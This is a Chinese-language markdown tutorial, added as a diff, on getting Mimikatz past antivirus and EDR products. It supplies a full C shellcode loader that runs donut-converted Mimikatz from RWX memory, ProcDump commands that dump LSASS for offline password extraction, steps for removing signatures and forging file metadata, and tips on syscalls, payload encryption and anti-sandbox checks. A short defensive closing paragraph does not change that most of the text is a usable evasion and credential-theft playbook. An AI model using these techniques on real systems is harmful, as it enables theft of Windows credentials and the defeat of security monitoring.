@@ -1,0 +1,194 @@
+## 1. 概述
+
+Mimikatz 是一款功能强大的开源后渗透测试工具，由 Benjamin Delpy ([@gentilkiwi](https://github.com/gentilkiwi)) 开发。它能够从 Windows 操作系统的内存中提取明文密码、哈希值、PIN 码和 Kerberos 票据等敏感凭证信息。由于其强大的能力和广泛的使用，Mimikatz 已成为全球主流防病毒（AV）和终端检测与响应（EDR）解决方案的重点监控和查杀对象。直接在目标系统上运行未经修改的 Mimikatz 原版程序，几乎会立即被检测并清除。
+
+本笔记旨在深入探讨和总结几种主流的 Mimikatz 免杀对抗技术。我们将从技术原理出发，结合实际操作命令和代码示例，系统性地介绍如何绕过安全产品的检测，在授权的渗透测试环境中有效利用 Mimikatz。
+
+在开始之前，进行免杀处理需要进行前置分析：
+*   **源码可用性**: 工具是否开源？例如，Mimikatz 是开源的。
+*   **代码复杂度**: 源码的逻辑是否易于理解和修改？
+*   **个人能力**: 你是否具备修改、编译和调试源代码的能力？
+
+如果源码不可用或修改难度过高，我们需要考虑其他策略，如加载器、离线分析等，并准备应对打包过程中可能出现的未知错误和效果不佳的问题。
+
+## 2. 技术原理
+
+现代安全产品主要通过以下几种方式检测 Mimikatz：
+
+*   **静态特征码检测**: 扫描文件，匹配 Mimikatz 二进制文件中硬编码的、独特的字符串或字节序列（例如 "mimikatz"、"gentilkiwi"、函数名等）。
+*   **行为监控**: 监视进程行为，如一个未知进程试图读取 `lsass.exe` 进程的内存，这被认为是高度可疑的行为。
+*   **API 挂钩 (Hooking)**: EDR 等产品会挂钩（Hook）敏感的 Windows API 调用（如 `OpenProcess`, `ReadProcessMemory`），当程序调用这些函数访问敏感进程时，EDR 会介入检查并拦截恶意行为。
+*   **内存扫描**: 定期扫描系统内存，查找已加载到内存中的 Mimikatz 模块或其特征。
+
+我们的免杀策略正是围绕着如何规避上述检测机制而展开的。
+
+## 3. 环境准备
+
+在进行实战演练前，请确保你已准备好以下工具：
+
+*   **Mimikatz**: 最新版本的源代码或已编译的二进制文件。
+    *   官方仓库: [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
+*   **Donut**: 一个能将 PE、.NET 程序集等文件转换为 Shellcode 的工具。
+    *   官方仓库: [https://github.com/TheWover/donut](https://github.com/TheWover/donut)
+*   **ProcDump**: 微软官方 Sysinternals 工具套件中的一员，用于转储进程内存，因其是白名单程序而难以被拦截。
+    *   官方下载: [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
+*   **Visual Studio**: 用于编译和修改 Mimikatz 源代码。建议使用 VS2019 或更高版本，并安装对应的 Windows SDK。
+*   **Python**: 用于运行加密脚本。
+
+## 4. 实战示例
+
+### 策略一：分离加载 Shellcode
+
+**原理**: 将 PE 文件（`mimikatz.exe`）转换为位置无关的 Shellcode。主程序（加载器）只负责读取 Shellcode 并注入内存执行。这样可以避免磁盘上存在完整的、易被检测的 PE 文件，同时加载器本身可以做得非常小且无恶意特征。
+
+**攻击流程**:
+
+1.  **生成 Shellcode**: 使用 `donut` 工具将 `mimikatz.exe` 转换为 Shellcode (`.bin` 文件)。
+    *   `-i`: 输入文件。
+    *   `-o`: 输出文件。
+    *   `-a`: 指定架构（2 代表 x64）。
+    *   `-f`: 指定输出格式（1 代表 bin）。
+
+    ```bash
+    # 将 mimikatz.exe 转换为64位的 Shellcode
+    donut.exe -i mimikatz.exe -o mimikatz.bin -a 2 -f 1
+    ```
+
+2.  **编写加载器**: 使用 C/C++ 等语言编写一个加载器。其核心逻辑是读取 `mimikatz.bin` 文件内容，申请一段可读、可写、可执行（RWX）的内存空间，将 Shellcode 复制进去，最后创建一个线程来执行它。
+
+    ```c
+    #include <windows.h>
+    #include <stdio.h>
+
+    int main() {
+        // 1. 读取 Shellcode 文件
+        HANDLE hFile = CreateFileA("mimikatz.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
+            printf("Failed to open file.\n");
+            return 1;
+        }
+        DWORD dwFileSize = GetFileSize(hFile, NULL);
+        unsigned char* shellcode = (unsigned char*)malloc(dwFileSize);
+        DWORD dwBytesRead;
+        ReadFile(hFile, shellcode, dwFileSize, &dwBytesRead, NULL);
+        CloseHandle(hFile);
+
+        // 2. 申请可执行内存
+        LPVOID pMemory = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (pMemory == NULL) {
+            printf("VirtualAlloc failed.\n");
+            free(shellcode);
+            return 1;
+        }
+
+        // 3. 复制 Shellcode 到新内存
+        RtlMoveMemory(pMemory, shellcode, dwFileSize);
+
+        // 4. 创建线程执行 Shellcode
+        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMemory, NULL, 0, NULL);
+        if (hThread == NULL) {
+            printf("CreateThread failed.\n");
+            VirtualFree(pMemory, 0, MEM_RELEASE);
+            free(shellcode);
+            return 1;
+        }
+
+        WaitForSingleObject(hThread, INFINITE); // 等待线程执行完毕
+
+        // 5. 清理
+        CloseHandle(hThread);
+        VirtualFree(pMemory, 0, MEM_RELEASE);
+        free(shellcode);
+
+        return 0;
+    }
+    ```
+
+### 策略二：Dump LSASS 内存并离线解析
+
+**原理**: 这是目前非常有效且隐蔽的一种方法。核心思想是利用一个**受信任的、有签名的白名单程序**（如 `ProcDump`）来转储 `lsass.exe` 进程的内存快照到 `.dmp` 文件。由于 `ProcDump` 是微软官方工具，其行为通常被安全软件视为合法，从而绕过主动防御。然后，将这个 `.dmp` 文件传输到攻击者自己的机器上，使用 Mimikatz 进行离线解析，提取凭证。
+
+**攻击流程**:
+
+1.  **在目标机器上转储 LSASS 内存**:
+    *   `-accepteula`: 自动接受最终用户许可协议。
+    *   `-ma`: 写入一个包含进程所有内存的转储文件。
+    *   `lsass.exe`: 目标进程。
+    *   `niuma.dmp`: 输出的转储文件名。
+
+    ```powershell
+    # 需要管理员权限
+    procdump.exe -accepteula -ma lsass.exe niuma.dmp
+    ```
+
+2.  **将转储文件传回本地**: 将生成的 `niuma.dmp` 文件通过网络传输到你的分析机器上。
+
+3.  **在本地机器上离线解析**: 使用你本地的 Mimikatz 加载并分析 `.dmp` 文件。
+
+    ```powershell
+    # 启动 mimikatz.exe
+    mimikatz.exe
+
+    # 在 Mimikatz 交互式控制台中执行命令
+    # 1. 加载内存转储文件
+    sekurlsa::minidump niuma.dmp
+
+    # 2. 从已加载的转储中提取密码
+    sekurlsa::logonpasswords
+
+    # 3. 退出
+    exit
+    ```
+    或者使用一行命令完成：
+    ```powershell
+    mimikatz.exe "sekurlsa::minidump niuma.dmp" "sekurlsa::logonpasswords" "exit"
+    ```
+
+### 策略三：源码级静态特征修改
+
+**原理**: 直接修改 Mimikatz 的源代码，移除或替换掉那些被安全厂商用作静态特征的字符串和元数据，然后重新编译生成一个“个性化”的版本。
+
+**攻击流程**:
+
+1.  **替换特征字符串**:
+    在 Visual Studio 中打开 Mimikatz 的项目，使用全局搜索功能查找并替换以下类型的字符串：
+    *   `mimikatz`
+    *   `gentilkiwi`
+    *   `benjamin`
+    *   `delpy`
+    *   `sekurlsa`
+    *   `logonpasswords`
+    *   以及其他在输出中常见的、具有高辨识度的字符串。
+
+    > **注意**: 替换时要小心，不要破坏代码逻辑。例如，可以将 "mimikatz" 替换为等长的其他词，如 "darkside"。
+
+2.  **清理文件详细信息**:
+    修改项目属性，清除或替换掉原始的文件版本信息、产品名称、公司、版权等元数据。
+    *   在 Visual Studio 中，找到 `mimikatz/mimikatz.rc` 文件。
+    *   编辑 `VERSION_INFO` 块，将 `FileDescription`, `ProductName`, `OriginalFilename`, `LegalCopyright` 等字段的值修改为通用或伪造的信息。
+
+3.  **重新编译**:
+    完成所有修改后，选择 `Release` 配置和对应的平台（`x64` 或 `Win32`），重新生成解决方案。你将在输出目录中得到一个修改版的 `mimikatz.exe`。
+
+### 策略四：自研替代工具
+
+**原理**: 不直接使用 Mimikatz，而是参考其原理，使用其他编程语言（如 PowerShell, C#, Go, Rust）实现其核心功能。这种方式可以完全避免 Mimikatz 的特征码，并且可以结合更高级的绕过技术。
+
+*   **使用系统调用 (Syscall)**: 在 C/C++ 或其他支持内联汇编的语言中，不直接调用被 EDR 挂钩的 WinAPI 函数（如 `OpenProcess`），而是通过 `syscall` 指令直接陷入内核执行相应的系统服务。这可以绕过应用层的 API 钩子。
+*   **PowerShell 无文件调用**: 使用 PowerShell 反射加载 .NET 程序集或直接调用 P/Invoke 来访问 Windows API，全程在内存中操作，不产生落地文件。
+
+## 5. 关键细节
+
+*   **加密与混淆**: 在使用分离加载策略时，可以对 Shellcode 或 PE 文件进行加密（如 AES, XOR）。加载器在运行时先解密再执行，这能有效对抗静态扫描。
+*   **动态获取函数地址**: 避免在代码中直接使用 `OpenProcess` 等敏感函数名。可以通过遍历 `kernel32.dll` 的导出表，根据哈希值或其他方式动态查找函数地址，增加逆向分析和静态检测的难度。
+*   **沙箱检测**: 在加载器中加入反沙箱技术，例如检测用户名、CPU 核心数、开机时间等，如果发现环境可疑则不执行恶意代码。
+
+## 6. 安全总结
+
+Mimikatz 的免杀对抗是一个持续演进的攻防博弈过程。本文介绍的几种方法——**Shellcode 加载**、**离线分析**、**源码修改**和**自研工具**——是当前比较主流且有效的策略。
+
+*   对于追求**高成功率和低检测率**的场景，**Dump LSASS + 离线解析**无疑是首选，因为它利用了白名单程序来执行最敏感的操作。
+*   **源码修改**和**Shellcode 加载**提供了更大的灵活性和定制空间，但对操作者的技术能力要求更高。
+*   **自研工具**是最高级的对抗形式，能够从根本上摆脱对原始工具的依赖，但开发成本也最高。
+
+作为安全从业者，理解这些攻击技术有助于我们更好地构建防御体系。防御方应考虑监控可疑的内存转储行为（即使来自白名单程序）、加强对无文件攻击的检测能力，并部署能够检测内存中恶意模块的 EDR 解决方案。攻防相长，不断学习和实践是提升安全能力的关键。
